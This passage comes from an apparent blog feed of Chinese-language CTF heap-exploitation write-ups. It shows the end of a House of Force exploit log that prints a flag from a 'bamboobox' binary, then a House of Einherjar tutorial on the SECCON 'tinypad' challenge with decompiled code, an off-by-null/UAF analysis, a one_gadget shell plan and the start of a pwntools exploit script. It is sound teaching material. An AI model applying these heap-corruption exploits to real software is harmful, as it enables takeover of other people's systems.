<span class="hljs-number">0x2</span> bytes:<br>    <span class="hljs-string">'2\n'</span><br>[DEBUG] Received <span class="hljs-number">0x117</span> bytes:<br>    <span class="hljs-string">'invaild choice!!!\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Bamboobox Menu\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'1.show the items in the box\n'</span><br>    <span class="hljs-string">'2.add a new item\n'</span><br>    <span class="hljs-string">'3.change the item in the box\n'</span><br>    <span class="hljs-string">'4.remove the item in the box\n'</span><br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:Please enter the length of item name:'</span><br>[DEBUG] Sent <span class="hljs-number">0x3</span> bytes:<br>    <span class="hljs-string">'16\n'</span><br>[DEBUG] Received <span class="hljs-number">0x1e</span> bytes:<br>    <span class="hljs-string">'Please enter the name of item:'</span><br>[DEBUG] Sent <span class="hljs-number">0x11</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">49</span> <span class="hljs-number">0</span>d <span class="hljs-number">40</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">49</span> <span class="hljs-number">0</span>d <span class="hljs-number">40</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │I·@·│····│I·@·│····│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">0</span>a                                                  │·│<br>    <span class="hljs-number">00000011</span><br>[DEBUG] Received <span class="hljs-number">0x1d2</span> bytes:<br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Bamboobox Menu\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'1.show the items in the box\n'</span><br>    <span class="hljs-string">'2.add a new item\n'</span><br>    <span class="hljs-string">'3.change the item in the box\n'</span><br>    <span class="hljs-string">'4.remove the item in the box\n'</span><br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:invaild choice!!!\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Bamboobox Menu\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'1.show the items in the box\n'</span><br>    <span class="hljs-string">'2.add a new item\n'</span><br>    <span class="hljs-string">'3.change the item in the box\n'</span><br>    <span class="hljs-string">'4.remove the item in the box\n'</span><br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:'</span><br>[DEBUG] Sent <span class="hljs-number">0x2</span> bytes:<br>    <span class="hljs-string">'5\n'</span><br>[*] Switching to interactive mode<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br><span class="hljs-number">1.</span>show the items in the box<br><span class="hljs-number">2.</span>add a new item<br><span class="hljs-number">3.</span>change the item in the box<br><span class="hljs-number">4.</span>remove the item in the box<br><span class="hljs-number">5.</span><span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:invaild choice!!!<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br><span class="hljs-number">1.</span>show the items in the box<br><span class="hljs-number">2.</span>add a new item<br><span class="hljs-number">3.</span>change the item in the box<br><span class="hljs-number">4.</span>remove the item in the box<br><span class="hljs-number">5.</span><span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:[*] Process <span class="hljs-string">'./bamboobox'</span> stopped with <span class="hljs-built_in">exit</span> code <span class="hljs-number">0</span> (pid <span class="hljs-number">29277</span>)<br>[DEBUG] Received <span class="hljs-number">0x15</span> bytes:<br>    <span class="hljs-string">'flag{house_of_force}\n'</span><br>flag{house_of_force}<br>[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br>$  <br></code></pre></td></tr></tbody></table></figure><p>可以看到已经打印出来了 flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;House-Of-Force（控制top-chunk）（基础）&quot;&gt;&lt;a href=&quot;#House-Of-Force（控制top-chunk）（基础）&quot; class=&quot;headerlink&quot; title=&quot;House Of Force（控制top_chunk）（基础</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Einherjar</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Einherjar/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Einherjar/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:19.992Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。</p><p>free 函数中的后向合并核心操作如下</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">prev_inuse</span>(p)) {<br>    prevsize = <span class="hljs-built_in">prev_size</span>(p);<br>    size += prevsize;<br>    p = <span class="hljs-built_in">chunk_at_offset</span>(p, -((<span class="hljs-type">long</span>) prevsize));<br>    <span class="hljs-built_in">unlink</span>(av, p, bck, fwd);<br>}<br></code></pre></td></tr></tbody></table></figure><blockquote><p>后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))<br class='item-img' data-src='https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p></blockquote><h2 id="思路1：两个chunk通过后向unlink直接实现任意地址写"><a href="#思路1：两个chunk通过后向unlink直接实现任意地址写" class="headerlink" title="思路1：两个chunk通过后向unlink直接实现任意地址写"></a>思路1：两个chunk通过后向unlink直接实现任意地址写</h2><p>假设有两个连续的chunk，我们利用低地址的chunk将高地址 chunk 的 prev_size 写为目标地址与当前地址的差值，free后合并，再malloc，就可以申请到目标地址的chunk，实现任意地址写，但是需要在目的 chunk 附近构造相应的 fake chunk，fake_chunk的size字段，必须和chunk_b的pre_size字段一致，为二者之间的偏移量，从而绕过 unlink 的检测。</p><h2 id="思路2：三个chunk通过后向unlink实现double-free"><a href="#思路2：三个chunk通过后向unlink实现double-free" class="headerlink" title="思路2：三个chunk通过后向unlink实现double free"></a>思路2：三个chunk通过后向unlink实现double free</h2><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chunk_0</span>  <span class="hljs-number">0</span>xD0    # 堆块大小需要保证释放后不进入tcache bin和fastbin，即存在tcache需要先填满对应的tcache <br><span class="hljs-attribute">chunk_1</span>  <span class="hljs-number">0</span>x18    # 堆块大小以<span class="hljs-number">8</span>结尾，保证<span class="hljs-literal">off</span> by null可以覆盖到下一个堆块的prev_inuse<br><span class="hljs-attribute">chunk_2</span>  <span class="hljs-number">0</span>xD0    # 堆块大小的最后一个字节必须为<span class="hljs-number">00</span>，也就是上一个堆块覆盖prev_inuse后不会影响该堆块的大小<br><span class="hljs-attribute">chunk_3</span>  <span class="hljs-number">0</span>x10    # 堆块大小任意，防止前面的堆块合并到Top chunk中<br></code></pre></td></tr></tbody></table></figure><p>申请四个chunk，第四个chunk用来将前三个chunk与top chunk隔开（防止free前三个chunk后与top chunk合并），先free(chunk_0)，利用off-by-null修改第2个chunk的mem，将第三个chunk的的prev_size修改为前两个chunk大小之和，然后free(chunk_2)，将chunk_0,chunk_1,chunk_2合并，之后申请chunk_0大小和chunk_1大小的chunk，再free(chunk_1),free(chunk_5)，实际chunk_1和chunk_5是同一个chunk，从而实现double free。</p><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="2016-seccon-tinypad"><a href="#2016-seccon-tinypad" class="headerlink" title="2016_seccon_tinypad"></a>2016_seccon_tinypad</h3><p class='item-img' data-src='https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851" alt="img"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>运行程序发现有四个功能：增删改退，分别用a,d,e,q进行操作，并且每次进行一次操作，程序会把每个chunk的内容输出出来，根据ida伪代码发现只能最多申请4个chunk<br class='item-img' data-src='https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><h4 id="ida伪代码"><a href="#ida伪代码" class="headerlink" title="ida伪代码"></a>ida伪代码</h4><p>主函数</p><figure class="highlight sas"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs sas">int __cdecl mai<span class="hljs-meta">n</span>(int argc, const char <span class="hljs-comment">**argv, const char **envp)</span><br><span class="hljs-comment">{</span><br><span class="hljs-comment">  __int64 v3;</span> // rax<br>  int choice; // eax<br>  int v5; // eax<br>  __int64 v6; // rax<br>  size_t v7; // rax<br>  int c; // [rsp+4h] [rbp-1Ch] BYREF<br>  int i; // [rsp+8h] [rbp-18h]<br>  int <span class="hljs-keyword">index</span>; // [rsp+Ch] [rbp-14h]<br>  int v12; // [rsp+10h] [rbp-10h]<br>  int v13; // [rsp+14h] [rbp-Ch]<br>  unsigned __int64 v14; // [rsp+18h] [rbp-8h]<br><br>  v14 = __readfsqword(0x28u);<br>  v12 = 0;<br>  write_<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;unk_4019F0</span>, 1uLL);<br>  write_<span class="hljs-meta">n</span>(<br>    <span class="hljs-string">"  ============================================================================\n"</span><br>    <span class="hljs-string">"// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n"</span><br>    <span class="hljs-string">"||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n"</span><br>    <span class="hljs-string">"||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n"</span><br>    <span class="hljs-string">"||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n"</span><br>    <span class="hljs-string">"\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\n"</span><br>    <span class="hljs-string">"  ============================================================================\n"</span>,<br>    563uLL);<br>  write_<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;unk_4019F0</span>, 1uLL);<br>  <span class="hljs-keyword">do</span><br>  {<br>    for ( i = 0; i &lt;= 3; ++i )<br>    {<br>      LO<span class="hljs-meta">BYTE</span>(c) = i + 49;<br>      writel<span class="hljs-meta">n</span>(<span class="hljs-string">"+------------------------------------------------------------------------------+\n"</span>, 81LL);<br>      write_<span class="hljs-meta">n</span>(<span class="hljs-string">" #   INDEX: "</span>, 12uLL);<br>      writel<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;c</span>, 1LL);<br>      write_<span class="hljs-meta">n</span>(<span class="hljs-string">" # CONTENT: "</span>, 12uLL);<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-comment">*&amp;tinypad[16 * i + 264] )</span><br><span class="hljs-comment">      {</span><br><span class="hljs-comment">        v3 = strlen(*&amp;tinypad[16 * i + 264]);</span><br>        writel<span class="hljs-meta">n</span>(<span class="hljs-comment">*&amp;tinypad[16 * i + 264], v3);</span><br>      }<br>      writel<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;unk_4019F0</span>, 1LL);<br>    }<br>    <span class="hljs-keyword">index</span> = 0;<br>    choice = getcmd();<br>    v12 = choice;<br>    <span class="hljs-keyword">if</span> ( choice == 68 )<br>    {<br>      write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(INDEX)&gt;&gt;&gt; "</span>, 11uLL);<br>      <span class="hljs-keyword">index</span> = read_<span class="hljs-meta">int</span>();<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">index</span> &lt;= 0 || <span class="hljs-keyword">index</span> &gt; 4 )            // 只能申请四个chunk<br>                                                // <br>      {<br>LABEL_29:<br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"Invalid index"</span>, 13LL);<br>        <span class="hljs-keyword">continue</span>;<br>      }<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-comment">*&amp;tinypad[16 * index + 240] )</span><br><span class="hljs-comment">      {</span><br><span class="hljs-comment">LABEL_31:</span><br><span class="hljs-comment">        writeln("Not used", 8LL);</span><br>        <span class="hljs-keyword">continue</span>;<br>      }<br>      free(<span class="hljs-comment">*&amp;tinypad[16 * index + 248]);</span><br>      <span class="hljs-comment">*&amp;tinypad[16 * index + 240] = 0LL;</span>        // size置为0，头指针未置为0<br>      writel<span class="hljs-meta">n</span>(<span class="hljs-string">"\nDeleted."</span>, 9LL);      //uaf<br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( choice &gt; 0x44 )<br>    {<br>      <span class="hljs-keyword">if</span> ( choice != 0x45 )<br>      {<br>        <span class="hljs-keyword">if</span> ( choice == 81 )<br>          <span class="hljs-keyword">continue</span>;<br>LABEL_41:<br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"No such a command"</span>, 17LL);<br>        <span class="hljs-keyword">continue</span>;<br>      }<br>      write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(INDEX)&gt;&gt;&gt; "</span>, 11uLL);<br>      <span class="hljs-keyword">index</span> = read_<span class="hljs-meta">int</span>();<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">index</span> &lt;= 0 || <span class="hljs-keyword">index</span> &gt; 4 )<br>        <span class="hljs-keyword">goto</span> LABEL_29;<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-comment">*&amp;tinypad[16 * index + 240] )</span><br><span class="hljs-comment">        goto LABEL_31;</span><br>      c = 48;<br>      strcpy(tinypad, <span class="hljs-comment">*&amp;tinypad[16 * index + 248]);</span><br>      <span class="hljs-keyword">while</span> ( toupper(c) != 89 )<br>      {<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"CONTENT: "</span>, 9uLL);<br>        v6 = strle<span class="hljs-meta">n</span>(tinypad);<br>        writel<span class="hljs-meta">n</span>(tinypad, v6);<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(CONTENT)&gt;&gt;&gt; "</span>, 13uLL);<br>        v7 = strle<span class="hljs-meta">n</span>(<span class="hljs-comment">*&amp;tinypad[16 * index + 248]);</span><br>        read_until(tinypad, v7, 10u);<br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"Is it OK?"</span>, 9LL);<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(Y/n)&gt;&gt;&gt; "</span>, 9uLL);<br>        read_until(<span class="hljs-variable">&amp;c</span>, 1uLL, 10u);<br>      }<br>      strcpy(<span class="hljs-comment">*&amp;tinypad[16 * index + 248], tinypad);</span><br>      writel<span class="hljs-meta">n</span>(<span class="hljs-string">"\nEdited."</span>, 8LL);<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( choice != 65 )<br>        <span class="hljs-keyword">goto</span> LABEL_41;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-keyword">index</span> &lt;= 3 <span class="hljs-variable">&amp;&amp;</span> <span class="hljs-comment">*&amp;tinypad[16 * index + 256] )</span><br><span class="hljs-comment">        ++index;</span><br>      <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">index</span> == 4 )<br>      {<br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"No space is left."</span>, 17LL);<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>        v13 = -1;<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(SIZE)&gt;&gt;&gt; "</span>, 10uLL);<br>        v13 = read_<span class="hljs-meta">int</span>();<br>        <span class="hljs-keyword">if</span> ( v13 &lt;= 0 )<br>        {<br>          v5 = 1;<br>        }<br>        <span class="hljs-keyword">else</span><br>        {<br>          v5 = v13;<br>          <span class="hljs-keyword">if</span> ( v13 &gt; 0x100 )<br>            v5 = 256;<br>        }<br>        v13 = v5;<br>        <span class="hljs-comment">*&amp;tinypad[16 * index + 256] = v5;</span><br>        <span class="hljs-comment">*&amp;tinypad[16 * index + 264] = malloc(v13);</span><br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-comment">*&amp;tinypad[16 * index + 264] )</span><br><span class="hljs-comment">        {</span><br><span class="hljs-comment">          writerrln("[!] No memory is available.", 27LL);</span><br>          exit(-1);<br>        }<br>        write_<span class="hljs-meta">n</span>(<span class="hljs-string">"(CONTENT)&gt;&gt;&gt; "</span>, 13uLL);<br>        read_until(<span class="hljs-comment">*&amp;tinypad[16 * index + 264], v13, 10u);</span><br>        writel<span class="hljs-meta">n</span>(<span class="hljs-string">"\nAdded."</span>, 7LL);<br>      }<br>    }<br>  }<br>  <span class="hljs-keyword">while</span> ( v12 != 81 );<br>  <span class="hljs-keyword">return</span> 0;<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">*<span class="hljs-meta">&amp;tinypad[16 * index + 0x100] = v5;</span><br>   *<span class="hljs-meta">&amp;tinypad[16 * index + 264] = malloc(v13);</span><br></code></pre></td></tr></tbody></table></figure><p>存在chunk全局数组，起始地址从0x602040+16*0+0x100=0x602140 开始依次存放chunk的size大小和头指针</p><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>该edit函数调用的read_until函数存在off-by-null漏洞</p><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851" alt="img"><br>free函数存在uaf漏洞</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先泄露libc和heap地址</p><p>利用 house of einherjar 方法在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p><p>这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。不能覆盖malloc_hook</p><figure class="highlight abnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v6</span> <span class="hljs-operator">=</span> strlen(tinypad)<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>可以泄露出environ 的地址，通过gdb调试进而求得存储 main 函数的返回地址的地址，将main 函数的返回地址覆盖为one_gadget来获得shell</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>先把前面的代码写好</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import*<br>context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>) <span class="hljs-comment">#小端序，linux系统，64位架构,debug</span><br>sh = process(<span class="hljs-string">'./tinypad'</span>)<br>libc = <span class="hljs-variable constant_">ELF</span>(<span class="hljs-string">'//home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so'</span>)<br><br><span class="hljs-comment">#命令简写化</span><br>s       = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:sh</span>.send(data)<br>sa      = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:sh</span>.sendafter(delim, data)<br>sl      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:sh</span>.sendline(data)<br>sla     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:sh</span>.sendlineafter(delim, data)<br>r       = <span class="hljs-built_in">lambda</span> num=<span class="hljs-number">4096</span>           <span class="hljs-symbol">:sh</span>.recv(num)<br>ru      = <span class="hljs-built_in">lambda</span> delims             <span class="hljs-symbol">:sh</span>.recvuntil(delims)<br>itr     = <span class="hljs-built_in">lambda</span>                    <span class="hljs-symbol">:sh</span>.interactive()<br>uu32    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u32</span>(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u64</span>(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = <span class="hljs-built_in">lambda</span> name,addr          <span class="hljs-symbol">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = <span class="hljs-built_in">lambda</span> address,data       <span class="hljs-symbol">:log</span>.success(<span class="hljs-string">'%s: '</span><span class="hljs-string">%(address)</span>+hex(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>        gdb.attach(sh)<br>        pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content=<span class="hljs-string">'a'</span></span>):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'a'</span>)<br>    sla(<span class="hljs-string">'(SIZE)&gt;&gt;&gt; '</span>,str(size))<br>    sla(<span class="hljs-string">'(CONTENT)&gt;&gt;&gt; '</span>,content)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'e'</span>)<br>    sla(<span class="hljs-string">'(INDEX)&gt;&gt;&gt; '</span>,str(idx))<br>    sla(<span class="hljs-string">'(CONTENT)&gt;&gt;&gt; '</span>,content)<br>    sla(<span class="hljs-string">'Is it OK?\n'</span>,<span class="hljs-string">'Y'</span>)<br>   <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'d'</span>)<br>    sla(<span class="hljs-string">'(INDEX)&gt;&gt;&gt; '</span>,str(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span 